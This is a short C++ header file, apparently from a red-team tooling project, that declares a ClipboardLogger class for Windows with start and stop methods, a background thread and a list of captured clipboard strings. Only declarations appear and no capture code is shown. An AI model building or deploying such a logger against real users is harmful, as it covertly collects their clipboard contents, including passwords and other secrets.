/*
* Author: Hegusung
* Github: https://github.com/hegusung/RedCpp
*/

#ifndef CLIPBOARD_HEADER
#define CLIPBOARD_HEADER

#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <list>
#include <mutex>
#include <Windows.h>
#include <tchar.h>


#include <fstream>
#include <iostream>
#include <string>
#include <windows.h>
#include <winuser.h>

class ClipboardLogger
{
public:
	ClipboardLogger();
	~ClipboardLogger();
	bool start_clipboard_logger();
	bool stop_clipboard_logger();
	std::list<std::string> get_logged_clipboards();
	std::list<std::string> logged_clipboards;
	HANDLE clipboard_logger_thread_handle;
};

DWORD WINAPI clipboard_logger_thread(LPVOID lpParameter);

#endif
